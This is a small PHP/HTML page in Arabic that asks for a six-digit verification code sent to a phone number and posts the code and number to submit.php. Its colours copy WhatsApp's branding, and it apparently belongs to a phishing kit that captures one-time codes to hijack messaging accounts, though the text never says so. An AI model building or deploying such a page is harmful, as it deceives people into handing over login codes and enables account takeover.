<?php $phone = htmlspecialchars($_POST['phone']); ?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>رمز التحقق</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to top right, #25D366, #075E54);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: 'Tajawal', sans-serif;
    }
    .card {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      text-align: center;
    }
    h2 {
      margin-bottom: 10px;
      color: #075E54;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 18px;
      text-align: center;
      letter-spacing: 5px;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #25D366;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    p {
      color: #555;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>رمز التحقق</h2>
    <p>تم إرسال الرمز إلى الرقم: <strong><?php echo $phone; ?></strong></p>
    <form action="submit.php" method="POST">
      <input type="hidden" name="phone" value="<?php echo $phone; ?>">
      <input type="text" name="code" maxlength="6" placeholder="••••••" required>
      <button type="submit">تأكيد</button>
    </form>
  </div>
</body>
</html>
